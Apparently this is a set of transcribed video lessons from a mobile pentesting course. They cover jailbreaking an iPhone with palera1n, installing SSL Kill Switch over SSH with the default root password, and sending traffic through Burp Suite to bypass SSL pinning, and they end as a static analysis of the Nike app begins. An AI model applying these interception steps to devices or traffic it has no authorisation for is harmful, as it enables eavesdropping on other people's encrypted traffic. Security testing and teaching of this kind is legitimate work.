00:07:59.640 --> 00:08:02.940
any kind of application, say for example like

176
00:08:02.940 --> 00:08:03.960
the Apple App Store.

177
00:08:04.120 --> 00:08:06.520
We should be able to intercept traffic going

178
00:08:06.520 --> 00:08:09.340
to the App Store now, and you can

179
00:08:09.340 --> 00:08:11.700
see that we are intercepting all this traffic

180
00:08:11.700 --> 00:08:12.100
here.

181
00:08:12.540 --> 00:08:14.400
Tons of tons of stuff that the App

182
00:08:14.400 --> 00:08:15.100
Store is tracking.

183
00:08:15.440 --> 00:08:17.600
If we go back to our settings now

184
00:08:17.600 --> 00:08:19.960
just to test to see if SSL Kill

185
00:08:19.960 --> 00:08:21.840
Switch actually does anything, I'm going to turn

186
00:08:21.840 --> 00:08:22.320
it off.

187
00:08:22.940 --> 00:08:23.960
I'm going to try to go back to

188
00:08:23.960 --> 00:08:29.640
the App Store now, close it out, open

189
00:08:29.640 --> 00:08:30.280
it up again.

190
00:08:31.059 --> 00:08:32.780
It does seem to be working actually.

191
00:08:33.340 --> 00:08:34.919
Oh now you can see it says cannot

192
00:08:34.919 --> 00:08:36.100
connect to the App Store.

193
00:08:36.419 --> 00:08:38.500
If I look for anything, this means that

194
00:08:38.500 --> 00:08:42.140
SSL pinning is actually preventing me from seeing

195
00:08:42.140 --> 00:08:44.720
anything off of the App Store, but if

196
00:08:44.720 --> 00:08:46.820
I go back now again to my settings,

197
00:08:47.540 --> 00:08:52.780
I enable SSL Kill Chain, SSL Kill Switch,

198
00:08:58.410 --> 00:09:02.580
and close out the App Store again, we

199
00:09:02.580 --> 00:09:05.320
can now actually see applications, right?

200
00:09:05.480 --> 00:09:07.540
I'm actually able to search for things, which

201
00:09:07.540 --> 00:09:11.700
means that we're breaking SSL pinning between our

202
00:09:11.700 --> 00:09:13.900
phone and the Apple App Store now.

203
00:09:14.060 --> 00:09:16.120
So we're actually able to intercept all these

204
00:09:16.120 --> 00:09:19.020
calls with Burp Suite because of the SSL

205
00:09:19.020 --> 00:09:22.100
Kill Chain application that we just installed.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.900 --> 00:00:04.560
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Welcome everyone to our new updated video on

2
00:00:04.560 --> 00:00:08.360
jailbreaking on iOS 15.x and up.

3
00:00:08.800 --> 00:00:10.880
So previously in the course I recommended that

4
00:00:10.880 --> 00:00:15.340
everyone use iOS 14.7 up to 15,

5
00:00:15.880 --> 00:00:16.140
right?

6
00:00:16.540 --> 00:00:18.440
And the reason for that is because jailbreaks

7
00:00:18.440 --> 00:00:21.020
for the newer versions of iOS did not

8
00:00:21.020 --> 00:00:21.500
exist.

9
00:00:22.000 --> 00:00:24.060
Well now there is a jailbreak out there

10
00:00:24.060 --> 00:00:26.120
and I was able to actually jailbreak my

11
00:00:26.120 --> 00:00:28.300
phone successfully so I wanted to update the

12
00:00:28.300 --> 00:00:30.760
course with these new jailbreaks so that you

13
00:00:30.760 --> 00:00:33.580
can actually use a physical iPhone and jailbreak

14
00:00:33.580 --> 00:00:36.060
it and intercept the traffic as we need

15
00:00:36.060 --> 00:00:37.520
to for mobile pen testing.

16
00:00:38.480 --> 00:00:40.260
So if we do a quick Google search

17
00:00:40.260 --> 00:00:42.840
here for the term pale rain with a

18
00:00:42.840 --> 00:00:46.060
one for the eye, this GitHub page is

19
00:00:46.060 --> 00:00:47.660
actually the jailbreak we'll be using.

20
00:00:48.260 --> 00:00:50.880
You'll see it uses the Checkmate jailbreak as

21
00:00:50.880 --> 00:00:51.260
before.

22
00:00:51.800 --> 00:00:54.500
And there are some subtleties to this jailbreak

23
00:00:54.500 --> 00:00:56.660
that we need to be very aware of.

24
00:00:56.960 --> 00:00:59.040
So first of all it says here pale

25
00:00:59.040 --> 00:01:02.100
rain will never work in VirtualBox, VMware, or

26
00:01:02.100 --> 00:01:04.880
any virtual machine that doesn't support a PCI

27
00:01:04.880 --> 00:01:05.520
pass-through.

28
00:01:05.900 --> 00:01:08.400
So in this case I'm actually using a

29
00:01:08.400 --> 00:01:11.920
physical Kali Linux machine with my iPhone attached

30
00:01:11.920 --> 00:01:14.000
to it with a USB-A to lightning

31
00:01:14.000 --> 00:01:14.520
cable.

32
00:01:15.400 --> 00:01:17.560
And this is how I have to jailbreak

33
00:01:17.560 --> 00:01:18.140
the phone.

34
00:01:18.480 --> 00:01:19.700
You need to meet these specifications.

35
00:01:20.460 --> 00:01:23.000
So either you need to have a physical

36
00:01:23.000 --> 00:01:25.180
Kali machine to do this jailbreak or you

37
00:01:25.180 --> 00:01:27.040
need to have a physical MacBook to do

38
00:01:27.040 --> 00:01:28.480
this jailbreak as well.

39
00:01:29.680 --> 00:01:31.560
And we'll see in the instructions that there's

40
00:01:31.560 --> 00:01:34.380
instructions for macOS and also Linux.

41
00:01:34.680 --> 00:01:37.020
So there are instructions for both of those

42
00:01:37.020 --> 00:01:38.020
types of machines.

43
00:01:38.220 --> 00:01:39.240
You will not be able to do this

44
00:01:39.240 --> 00:01:40.880
jailbreak on a Windows machine.

45
00:01:41.240 --> 00:01:42.620
You will not be able to do it

46
00:01:42.620 --> 00:01:43.800
on a virtual machine.

47
00:01:44.880 --> 00:01:47.300
You'll also see there are some requirements for

48
00:01:47.300 --> 00:01:49.440
the actual iOS device itself.

49
00:01:49.440 --> 00:01:51.840
So you need to have a Checkmate Vulnerable

50
00:01:51.840 --> 00:01:55.160
iOS device on iOS 15.x through 16

51
00:01:55.160 --> 00:01:57.760
.x and it has to be on the

52
00:01:57.760 --> 00:02:00.960
A8 chipset to A11 chipset.

53
00:02:01.080 --> 00:02:04.480
So anything A11 and below is the target

54
00:02:04.480 --> 00:02:05.540
of this exploit.

55
00:02:05.860 --> 00:02:07.639
This would be something like the iPhone 8.

56
00:02:08.520 --> 00:02:12.180
Anything around that generation that's on iOS 15

57
00:02:12.180 --> 00:02:15.260
through 16 would be your targeted device for

58
00:02:15.260 --> 00:02:15.460
this.

59
00:02:15.460 --> 00:02:17.540
You can usually find phones like that at

60
00:02:17.540 --> 00:02:19.820
phone repair stores, stuff like that.

61
00:02:21.320 --> 00:02:23.680
I've had good luck finding those at repair

62
00:02:23.680 --> 00:02:25.180
shops for fairly cheap.

63
00:02:25.700 --> 00:02:27.840
So just make sure that you're checking out

64
00:02:27.840 --> 00:02:30.620
the version of iOS and also the chipset

65
00:02:30.620 --> 00:02:33.160
that is associated with that device before you

66
00:02:33.160 --> 00:02:35.000
go out and buy a physical iPhone.

67
00:02:36.420 --> 00:02:38.680
So here are some other device requirements.

68
00:02:39.020 --> 00:02:41.840
For example, it says if you want the

69
00:02:41.840 --> 00:02:43.700
device to be semi-tethered, you'll need to

70
00:02:43.700 --> 00:02:46.480
have 5 to 10 gigabytes of space with

71
00:02:46.480 --> 00:02:47.200
a fake FS.

72
00:02:47.440 --> 00:02:49.080
So if you want a semi-tethered, you

73
00:02:49.080 --> 00:02:50.720
want to be able to unplug the device.

74
00:02:50.980 --> 00:02:52.480
When you reboot it, you're still going to

75
00:02:52.480 --> 00:02:54.300
have to re-jailbreak with this jailbreak.

76
00:02:54.880 --> 00:02:56.960
But if you want to have it semi

77
00:02:56.960 --> 00:02:58.540
-tethered, you're going to need that much space.

78
00:02:59.620 --> 00:03:05.160
If you're on A10X, use CheckP4LE for full

79
00:03:05.160 --> 00:03:05.820
functionality.

80
00:03:06.640 --> 00:03:09.140
On A11, you must disable your passcode while

81
00:03:09.140 --> 00:03:10.380
in the jailbroken state.

82
00:03:10.380 --> 00:03:12.460
So if you do have a passcode on

83
00:03:12.460 --> 00:03:14.080
your device, you're going to have to remove

84
00:03:14.080 --> 00:03:16.940
that before you're able to jailbreak the device.

85
00:03:17.760 --> 00:03:22.180
Finally, a USB-A cable is recommended.

86
00:03:22.440 --> 00:03:24.620
So USB-C cables apparently have been having

87
00:03:24.620 --> 00:03:26.060
some issues with this jailbreak.

88
00:03:26.260 --> 00:03:28.580
In my case, I have a USB-A

89
00:03:28.580 --> 00:03:32.060
to Lightning cable attached to my iPhone 8,

90
00:03:32.180 --> 00:03:36.000
which is on iOS 15.4. A Linux

91
00:03:36.000 --> 00:03:37.360
or Mac OS computer.

92
00:03:37.360 --> 00:03:40.500
So those are all the requirements for this

93
00:03:40.500 --> 00:03:41.040
jailbreak.

94
00:03:41.160 --> 00:03:43.020
Let's actually see how you can do this.

95
00:03:43.460 --> 00:03:44.920
And for some reason, when you go to

96
00:03:44.920 --> 00:03:47.680
the releases here, this does not have all

97
00:03:47.680 --> 00:03:49.420
the actual information that you need.

98
00:03:49.500 --> 00:03:51.280
This is like the source code of the

99
00:03:51.280 --> 00:03:52.000
repos, right?

100
00:03:52.480 --> 00:03:57.260
But if we go to palerain.in, which

101
00:03:57.260 --> 00:03:59.260
is the second result on Google, and you

102
00:03:59.260 --> 00:04:01.800
click Get Started, it will take you to

103
00:04:01.800 --> 00:04:03.820
a different releases page when you're here.

104
00:04:06.500 --> 00:04:09.040
So the version of Pale Rain for your

105
00:04:09.040 --> 00:04:12.780
OS, and click that, opens this up in

106
00:04:12.780 --> 00:04:13.600
a new tab.

107
00:04:14.580 --> 00:04:17.180
And you have all your assets right here.

108
00:04:17.459 --> 00:04:20.560
So these are pre-compiled binaries for each

109
00:04:20.560 --> 00:04:22.060
one of your devices.

110
00:04:22.300 --> 00:04:26.240
So we have Linux x86 underscore 64, Mac

111
00:04:26.240 --> 00:04:27.320
OS, et cetera.

112
00:04:27.780 --> 00:04:30.880
In my case, I am on Linux x86

113
00:04:30.880 --> 00:04:32.280
underscore 64.

114
00:04:32.280 --> 00:04:33.440
So I'm going to click this.

115
00:04:34.600 --> 00:04:37.520
It's going to download the file and save

116
00:04:37.520 --> 00:04:40.220
it into my Downloads folder, of course, right?

117
00:04:40.340 --> 00:04:43.900
So we do see this executable is now

118
00:04:43.900 --> 00:04:44.800
in my Downloads folder.

119
00:04:46.480 --> 00:04:49.080
Okay, so now let's go to the instructions

120
00:04:49.080 --> 00:04:50.060
for Linux.

121
00:04:51.040 --> 00:04:52.800
It says, if you're using a virtual machine,

122
00:04:52.820 --> 00:04:55.380
you will not have success following this guide.

123
00:04:56.560 --> 00:04:59.020
If you're using USB-C to lightning cable

124
00:04:59.020 --> 00:05:00.900
to do this, you may run into issues.

125
00:05:00.960 --> 00:05:02.160
So you have to have USB-A to

126
00:05:02.160 --> 00:05:06.440
lightning, or a USB-C to USB-A

127
00:05:06.440 --> 00:05:06.940
adapter.

128
00:05:07.600 --> 00:05:09.920
Okay, so it says, open up a terminal

129
00:05:09.920 --> 00:05:14.260
window, says sudo systemctl stop usbmuxd.

130
00:05:14.820 --> 00:05:16.840
I'm going to not do that because I'll

131
00:05:16.840 --> 00:05:18.680
lose my microphone if I do that.

132
00:05:20.340 --> 00:05:22.720
So it says next to cd to the

133
00:05:22.720 --> 00:05:24.640
directory that Pale Rain was downloaded to.

134
00:05:24.760 --> 00:05:27.160
So it's where this executable file is.

135
00:05:27.880 --> 00:05:37.850
And I'm going to go and

136
00:05:37.850 --> 00:05:45.650
go sudo move dot slash palerainlinux-x86 underscore

137
00:05:45.650 --> 00:05:46.250
64.

138
00:05:46.550 --> 00:05:48.430
You can see they have this little star

139
00:05:48.430 --> 00:05:50.710
there to indicate whichever file you downloaded.

140
00:05:51.490 --> 00:05:53.150
Whichever file it is, you're going to move

141
00:05:53.150 --> 00:05:54.850
it to userbin palerain.

142
00:05:55.170 --> 00:05:57.390
And what that's going to do is allow

143
00:05:57.390 --> 00:06:00.790
us to run this file from anywhere, right?

144
00:06:02.150 --> 00:06:03.850
We're going to go userbin palerain.

145
00:06:05.310 --> 00:06:07.030
And then we have to do a sudo

146
00:06:07.030 --> 00:06:12.350
chmod plus x userbin palerain.

147
00:06:12.470 --> 00:06:14.790
So this just makes the file executable, right?

148
00:06:15.050 --> 00:06:16.910
We'll be able to execute it anywhere in

149
00:06:16.910 --> 00:06:17.730
the file system.

150
00:06:18.010 --> 00:06:19.770
So if I open a new tab now,

151
00:06:20.050 --> 00:06:24.290
and I'm just in my home directory, I

152
00:06:24.290 --> 00:06:26.830
do palerain, it'll pop up as a command.

153
00:06:27.110 --> 00:06:28.810
And you can see now that it will

154
00:06:28.810 --> 00:06:29.230
be running.

155
00:06:30.310 --> 00:06:34.610
Okay, so now we run into some options

156
00:06:34.610 --> 00:06:35.910
for what we want to do.

157
00:06:36.470 --> 00:06:39.790
So it says run sudo palerain insert arguments

158
00:06:39.790 --> 00:06:40.150
here.

159
00:06:40.670 --> 00:06:43.850
So 16 GB devices should use sudo palerain

160
00:06:43.850 --> 00:06:45.190
-b-f.

161
00:06:45.730 --> 00:06:49.930
If you have a 16 gigabyte device with

162
00:06:49.930 --> 00:06:52.630
two to three gigabytes of storage space free.

163
00:06:52.810 --> 00:06:54.270
So you're going to choose the flavour of

164
00:06:54.270 --> 00:06:55.390
this no matter what you're doing.

165
00:06:56.070 --> 00:06:58.410
Devices which have iOS 16 or have more

166
00:06:58.410 --> 00:07:00.590
than 10 to 15 gigs of storage space

167
00:07:00.590 --> 00:07:03.430
should use palerain-c-f.

168
00:07:03.610 --> 00:07:05.830
So in my case, I would do that.

169
00:07:07.130 --> 00:07:11.790
sudo palerain-c-f, right?

170
00:07:12.790 --> 00:07:16.390
And over here, my iPhone is actually sitting

171
00:07:16.390 --> 00:07:17.390
on DFU mode.

172
00:07:17.450 --> 00:07:19.750
So it says, please press enter when ready

173
00:07:19.750 --> 00:07:20.910
for DFU mode.

174
00:07:21.510 --> 00:07:24.090
So when your iPhone shows a little icon

175
00:07:24.090 --> 00:07:27.370
of a computer, that's when you're in DFU

176
00:07:27.370 --> 00:07:27.590
mode.

177
00:07:27.590 --> 00:07:28.670
So now I'm going to press enter.

178
00:07:29.150 --> 00:07:30.410
It's going to say, get ready.

179
00:07:30.650 --> 00:07:32.330
And when this goes, we're going to press

180
00:07:32.330 --> 00:07:34.730
the volume down and the side button at

181
00:07:34.730 --> 00:07:35.510
the same time.

182
00:07:35.870 --> 00:07:37.430
Then we're going to release the side button

183
00:07:37.430 --> 00:07:39.590
and just keep on holding the volume down

184
00:07:39.590 --> 00:07:42.670
button and hold it for 10 seconds here.

185
00:07:43.250 --> 00:07:45.250
And you're going to see this Checkmate triggered.

186
00:07:45.410 --> 00:07:47.990
And when you see Checkmate, your device will

187
00:07:47.990 --> 00:07:51.690
actually start to load the Apple icon and

188
00:07:51.690 --> 00:07:55.710
it'll show Checkmate icon similarly to how we

189
00:07:55.710 --> 00:07:57.350
did this with Checkbrain as well.

190
00:07:57.590 --> 00:07:59.490
Now my iPhone is going to be going

191
00:07:59.490 --> 00:08:00.790
through that setup process.

192
00:08:00.970 --> 00:08:03.230
I unfortunately cannot show it on the screen,

193
00:08:03.710 --> 00:08:05.590
but we will hop over and I'll show

194
00:08:05.590 --> 00:08:07.590
you how to set up all the things

195
00:08:07.590 --> 00:08:11.490
for SSL Kill Switch using Pale Rain and

196
00:08:11.490 --> 00:08:12.870
how it's a little bit different than our

197
00:08:12.870 --> 00:08:14.210
previous Jailbreak.

198
00:08:15.250 --> 00:08:17.450
So I'm happy to provide this course update

199
00:08:17.450 --> 00:08:20.470
on how to jailbreak iOS 15 through 16.

200
00:08:20.850 --> 00:08:23.150
Hope you found this video useful and good

201
00:08:23.150 --> 00:08:24.430
luck with your jailbreak.



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.710 --> 00:00:03.790
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Okay, so now that we have our iPhone

2
00:00:03.790 --> 00:00:06.710
jailbroken, this is what it's going to look

3
00:00:06.710 --> 00:00:07.070
like.

4
00:00:07.710 --> 00:00:09.250
And you can see here we have a

5
00:00:09.250 --> 00:00:10.290
Pale Rain icon.

6
00:00:10.550 --> 00:00:12.410
So when you make it this far, all

7
00:00:12.410 --> 00:00:13.770
you have to do is click Pale Rain,

8
00:00:13.910 --> 00:00:15.490
and you're going to click the instal button

9
00:00:15.490 --> 00:00:18.390
there, and it's going to instal everything you're

10
00:00:18.390 --> 00:00:20.050
going to need for jailbreaking.

11
00:00:21.010 --> 00:00:24.270
You might reboot your phone once, and if

12
00:00:24.270 --> 00:00:25.370
you do have to do that, you can

13
00:00:25.370 --> 00:00:28.910
use the command sudo palerain-f off of

14
00:00:28.910 --> 00:00:31.670
your Linux box or wherever you actually jailbroke

15
00:00:31.670 --> 00:00:32.550
the device from.

16
00:00:33.130 --> 00:00:35.430
And once that's all installed, you will see

17
00:00:35.430 --> 00:00:39.710
this Cilio Nightly application on there, and this

18
00:00:39.710 --> 00:00:41.250
is where you can download lots of different

19
00:00:41.250 --> 00:00:44.050
apps that are out there on the jailbroken

20
00:00:44.050 --> 00:00:47.230
section of the internet.

21
00:00:48.870 --> 00:00:51.550
But we're not really interested in anything there.

22
00:00:51.550 --> 00:00:55.290
What we are interested in is actually bypassing

23
00:00:55.290 --> 00:00:57.070
SSL pinning, right?

24
00:00:57.550 --> 00:01:00.050
And the tool that I recommended before when

25
00:01:00.050 --> 00:01:02.010
we used the Check Rain jailbreak was also

26
00:01:02.010 --> 00:01:05.570
this SSL Kill Switch version 2, and this

27
00:01:05.570 --> 00:01:08.890
actually works as well on iOS 15 through

28
00:01:08.890 --> 00:01:09.430
16.

29
00:01:10.170 --> 00:01:12.890
Now again, warning, this tweak will make your

30
00:01:12.890 --> 00:01:17.110
device insecure because we are decrypting application traffic.

31
00:01:17.110 --> 00:01:19.990
Okay, but how we're going to instal this

32
00:01:19.990 --> 00:01:23.690
is just like before when we integrated SSL

33
00:01:23.690 --> 00:01:24.350
Kill Switch.

34
00:01:24.710 --> 00:01:26.230
If we do go to my settings, you'll

35
00:01:26.230 --> 00:01:29.550
see it's already installed down here, but I

36
00:01:29.550 --> 00:01:31.450
will show you step-by-step now how

37
00:01:31.450 --> 00:01:32.570
to actually do this.

38
00:01:33.050 --> 00:01:34.610
So I'm just going to open up a

39
00:01:34.610 --> 00:01:41.420
PowerShell window here, and I'm going to actually

40
00:01:41.420 --> 00:01:43.700
SSH into my iPhone now.

41
00:01:43.780 --> 00:01:44.840
So I'm going to go to Settings.

42
00:01:45.060 --> 00:01:47.000
I'm going to go to Network.

43
00:01:47.860 --> 00:01:49.980
Get my IP address out of here.

44
00:01:50.880 --> 00:01:54.900
You see it's 192.168.0.12. I'm

45
00:01:54.900 --> 00:01:58.400
going to do SSH root at 192.168

46
00:01:58.400 --> 00:02:02.220
.0.12. Okay, and you're going to say

47
00:02:02.220 --> 00:02:04.800
yes to this, and the default password for

48
00:02:04.800 --> 00:02:07.000
root is alpine, all lowercase.

49
00:02:07.320 --> 00:02:09.160
Now we can see that I'm actually logged

50
00:02:09.160 --> 00:02:14.060
into the phone via SSH here, and if

51
00:02:14.060 --> 00:02:16.140
I do an LS, you'll see I have

52
00:02:16.140 --> 00:02:18.120
this package already installed here.

53
00:02:18.440 --> 00:02:21.880
You can see dpkg-ipackage.dev. This is

54
00:02:21.880 --> 00:02:23.120
how we're going to instal this.

55
00:02:23.640 --> 00:02:26.920
So all you need to do here is

56
00:02:26.920 --> 00:02:27.940
just go to the releases.

57
00:02:28.400 --> 00:02:30.800
You can right-click here, say copy link

58
00:02:30.800 --> 00:02:33.700
address, and you can just do a wgit.

59
00:02:35.860 --> 00:02:41.240
You do a wgit and just paste that

60
00:02:41.240 --> 00:02:44.380
whole string in there and press enter, and

61
00:02:44.380 --> 00:02:46.620
it will download SSL Kill Switch.

62
00:02:47.060 --> 00:02:48.960
If it says that the wgit command is

63
00:02:48.960 --> 00:02:51.040
not found, of course you can always instal

64
00:02:51.040 --> 00:02:54.500
it like a sudo apt-get wgit.

65
00:02:55.020 --> 00:02:58.020
So once we have that, we do an

66
00:02:58.020 --> 00:02:58.580
LS here.

67
00:02:58.680 --> 00:03:01.880
You can see we have com.navlag code

68
00:03:01.880 --> 00:03:05.700
sslkillswitch2.dev. So now what we would do,

69
00:03:05.800 --> 00:03:06.700
go back to the instructor.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.070 --> 00:00:02.670
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Okay, so now that we have everything set

2
00:00:02.670 --> 00:00:04.930
up with SSL Kill Switch, we're going to

3
00:00:04.930 --> 00:00:07.109
actually set up our BERT proxy again.

4
00:00:07.630 --> 00:00:09.210
So, all you need to do in BERT,

5
00:00:09.390 --> 00:00:10.790
again, is go to Options.

6
00:00:11.270 --> 00:00:12.450
Here I already have it set up, but

7
00:00:12.450 --> 00:00:14.130
you're going to click Edit, and then click

8
00:00:14.130 --> 00:00:16.150
All Interfaces and click OK.

9
00:00:16.750 --> 00:00:18.650
Again, this is going to open up a

10
00:00:18.650 --> 00:00:21.350
port on your BERT machine for your iPhone

11
00:00:21.350 --> 00:00:22.550
to reach back out to.

12
00:00:23.150 --> 00:00:25.110
Now, we need to provide that IP address

13
00:00:25.110 --> 00:00:27.810
as the proxy within our iPhone.

14
00:00:27.810 --> 00:00:29.050
So, I'm going to click my Wi-Fi

15
00:00:29.050 --> 00:00:32.630
network here, go down to Configure Proxy, click

16
00:00:32.630 --> 00:00:33.070
Manual.

17
00:00:33.990 --> 00:00:35.890
Then we're going to put the IP address

18
00:00:35.890 --> 00:00:38.650
of my BERT Suite machine, which in this

19
00:00:38.650 --> 00:00:43.030
case is 192.168.0.30. And again,

20
00:00:43.090 --> 00:00:45.270
it's on port 8080 because I configured it

21
00:00:45.270 --> 00:00:45.670
that way.

22
00:00:46.230 --> 00:00:47.050
I'm going to click Save.

23
00:00:47.670 --> 00:00:49.990
Now, we need to actually trust the BERT

24
00:00:49.990 --> 00:00:50.990
certificate, right?

25
00:00:51.030 --> 00:00:52.250
So, I'm going to go to my web

26
00:00:52.250 --> 00:00:52.990
browser here.

27
00:00:53.550 --> 00:00:55.330
I'm just going to type in BERT port

28
00:00:55.330 --> 00:00:57.010
8080, just like this.

29
00:00:57.730 --> 00:00:59.730
You'll be brought to this BERT Suite screen,

30
00:01:00.010 --> 00:01:00.910
and all you have to do is click

31
00:01:00.910 --> 00:01:01.990
CA Certificate.

32
00:01:02.250 --> 00:01:04.269
It says the website's trying to download a

33
00:01:04.269 --> 00:01:05.390
configuration profile.

34
00:01:05.570 --> 00:01:06.170
Click Allow.

35
00:01:06.950 --> 00:01:08.070
Download the profile.

36
00:01:08.370 --> 00:01:09.950
Now, we have to go into our settings

37
00:01:09.950 --> 00:01:11.270
and actually trust that.

38
00:01:11.790 --> 00:01:14.650
So, let me scroll down here to General,

39
00:01:15.550 --> 00:01:18.630
and then go to VPN and Device Management.

40
00:01:19.230 --> 00:01:21.850
You're going to click Port Swigger CA, Install,

41
00:01:22.290 --> 00:01:23.510
Install, Install.

42
00:01:24.050 --> 00:01:26.090
Then you have to go to the Certificate

43
00:01:26.090 --> 00:01:26.790
Trust setting.

44
00:01:26.790 --> 00:01:29.050
So, we're going to click Back, go to

45
00:01:29.050 --> 00:01:33.090
About, scroll down to Trust Settings, and enable

46
00:01:33.090 --> 00:01:34.330
the Port Swigger CA.

47
00:01:35.170 --> 00:01:37.090
Now, to test this, we can go to,

48
00:01:37.090 --> 00:01:38.410
say, google.com.

49
00:01:38.830 --> 00:01:41.150
Let me turn my intercept back on really

50
00:01:41.150 --> 00:01:42.310
quick in BERT Suite.

51
00:01:43.570 --> 00:01:52.760
And if I go to google.com, we

52
00:01:52.760 --> 00:01:54.680
see the traffic now in BERT Suite.

53
00:01:54.760 --> 00:01:56.500
So, we're able to intercept from the web

54
00:01:56.500 --> 00:01:56.860
browser.

55
00:01:56.860 --> 00:02:00.400
And then the final step of this, of

56
00:02:00.400 --> 00:02:02.960
course, is just enabling SSL Kill Switch.

57
00:02:03.700 --> 00:02:06.500
So, assuming you have SSL Kill Switch installed

58
00:02:06.500 --> 00:02:08.860
successfully, all you need to do is go

59
00:02:08.860 --> 00:02:11.760
to Settings, go back here to the main

60
00:02:11.760 --> 00:02:16.440
menu, scroll all the way down, and you'll

61
00:02:16.440 --> 00:02:18.260
see this SSL Kill Switch here.

62
00:02:18.620 --> 00:02:19.860
And you just want to make sure this

63
00:02:19.860 --> 00:02:22.680
is enabled, the green little box just like

64
00:02:22.680 --> 00:02:22.880
that.

65
00:02:22.960 --> 00:02:24.700
All you have to do is click the

66
00:02:24.700 --> 00:02:25.600
little toggle switch.

67
00:02:26.320 --> 00:02:28.260
And just to prove that this is actually

68
00:02:28.260 --> 00:02:30.920
working for intercepted traffic, let's go to Apple

69
00:02:30.920 --> 00:02:31.920
Podcasts here.

70
00:02:37.260 --> 00:02:38.920
And here you can see that we're actually

71
00:02:38.920 --> 00:02:42.020
intercepting some things from iTunes.apple.com.

72
00:02:42.600 --> 00:02:44.600
And you can see it's loading up this

73
00:02:44.600 --> 00:02:44.940
podcast.

74
00:02:45.400 --> 00:02:49.000
So, we are able to successfully intercept traffic

75
00:02:49.000 --> 00:02:53.700
here for the Apple Podcast application.

76
00:02:54.480 --> 00:02:56.740
And that's all this video is about, just

77
00:02:56.740 --> 00:03:00.320
intercepting SSL traffic for your iPhone using SSL

78
00:03:00.320 --> 00:03:03.460
Kill Switch on the newest jailbreak available.

79
00:03:04.040 --> 00:03:05.940
So, I hope you enjoyed, and thanks for

80
00:03:05.940 --> 00:03:06.280
watching.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

==================================================================================


# Section 13: iOS-Bug-Bounty-Hunt

WEBVTT

1
00:00:00.010 --> 00:00:03.370
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Okay, let's go ahead and actually show a

2
00:00:03.370 --> 00:00:07.170
live bug bounty hunt for an iOS application,

3
00:00:07.510 --> 00:00:09.430
so we can put all the pieces that

4
00:00:09.430 --> 00:00:12.410
we've learned from these videos together into one

5
00:00:12.410 --> 00:00:13.350
example.

6
00:00:13.810 --> 00:00:15.570
So the first thing I'm going to do

7
00:00:15.570 --> 00:00:17.270
is just go to the App Store here,

8
00:00:17.510 --> 00:00:19.670
and I do have Burp Suite turned off,

9
00:00:19.690 --> 00:00:21.670
so make sure that you have Burp Suite

10
00:00:21.670 --> 00:00:25.590
turned off if you were intercepting traffic using

11
00:00:25.590 --> 00:00:26.130
your iPhone.

12
00:00:27.490 --> 00:00:29.930
And in this case, let's just go down

13
00:00:29.930 --> 00:00:32.030
and find some random app.

14
00:00:33.070 --> 00:00:35.450
Let's actually do the Nike app, it sounds

15
00:00:35.450 --> 00:00:36.010
interesting.

16
00:00:36.810 --> 00:00:38.390
And then, so I'm just going to click

17
00:00:38.390 --> 00:00:42.230
Install here, going to put in my information

18
00:00:42.230 --> 00:01:00.630
to download the application, and

19
00:01:00.630 --> 00:01:02.570
let's wait for this to install.

20
00:01:04.600 --> 00:01:06.600
Okay, so now we see that the Nike

21
00:01:06.600 --> 00:01:08.260
application is installed.

22
00:01:08.260 --> 00:01:10.380
Now we need to pull this off the

23
00:01:10.380 --> 00:01:15.920
phone by using AnyTrans, so I'm just going

24
00:01:15.920 --> 00:01:17.740
to open up AnyTrans here on my MacBook,

25
00:01:21.510 --> 00:01:23.690
and I'm going to go down here to

26
00:01:23.690 --> 00:01:28.690
the App Store, type in Nike here, and

27
00:01:28.690 --> 00:01:29.450
click Download.

28
00:01:30.930 --> 00:01:45.870
Sign in with my Apple ID, click

29
00:01:45.870 --> 00:01:48.430
Download one more time, should be adding this

30
00:01:48.430 --> 00:01:51.530
to our application library and downloading successfully.

31
00:02:03.020 --> 00:02:04.760
Okay, so you can see the download is

32
00:02:04.760 --> 00:02:05.220
completed.

33
00:02:05.440 --> 00:02:07.600
I'm going to click Download to Mac up

34
00:02:07.600 --> 00:02:11.200
here in the top right, and I'm just

35
00:02:11.200 --> 00:02:13.580
going to save this into my documents here.

36
00:02:16.360 --> 00:02:18.120
So I copied Nike over, I'm going to

37
00:02:18.120 --> 00:02:19.960
click View Files now to open the File

38
00:02:19.960 --> 00:02:22.260
Explorer, and now we can see this is

39
00:02:22.260 --> 00:02:29.510
the Nike.ipa. Okay, so now what we

40
00:02:29.510 --> 00:02:31.490
need to do to start the static analysis

41
00:02:31.490 --> 00:02:34.570
process, you can either take this and put

42
00:02:34.570 --> 00:02:37.350
it through MobSF, or you can do the

43
00:02:37.350 --> 00:02:39.710
static analysis process manually.

44
00:02:40.150 --> 00:02:42.130
In my case, I'll do it manually just

45
00:02:42.130 --> 00:02:46.130
for the demonstration here, but click here and

46
00:02:46.130 --> 00:02:48.350
just make a duplicate of this file so

47
00:02:48.350 --> 00:02:50.070
we have a copy to work with.

48
00:02:51.210 --> 00:02:54.530
Okay, so we have our Nike.ipa, so

49
00:02:54.530 --> 00:02:57.470
now I'm going to rename this file to

50
00:02:57.470 --> 00:03:04.380
payload.zip, and I'm going to click Use

51
00:03:04.380 --> 00:03:04.720
Zip.

52
00:03:05.980 --> 00:03:07.820
Okay, and then I'm going to open up

53
00:03:07.820 --> 00:03:08.360
this file.

54
00:03:10.020 --> 00:03:12.960
It's going to start expanding the application, and

55
00:03:12.960 --> 00:03:14.400
then we'll be able to actually look at

56
00:03:14.400 --> 00:03:17.340
the file contents and do a static analysis

57
00:03:17.340 --> 00:03:17.880
manually.

58
00:03:18.520 --> 00:03:20.440
I'm going to just expand that folder.

59
00:03:22.280 --> 00:03:23.740
Let's see if I can make this any

60
00:03:23.740 --> 00:03:24.080
bigger.

61
00:03:31.150 --> 00:03:33.090
Okay, so we have our payload folder here.

62
00:03:33.170 --> 00:03:34.310
I'm going to click into it.

63
00:03:34.590 --> 00:03:36.530
Again, we want to take a moment and

64
00:03:36.530 --> 00:03:39.150
check the iTunesMetadata.plist here.

65
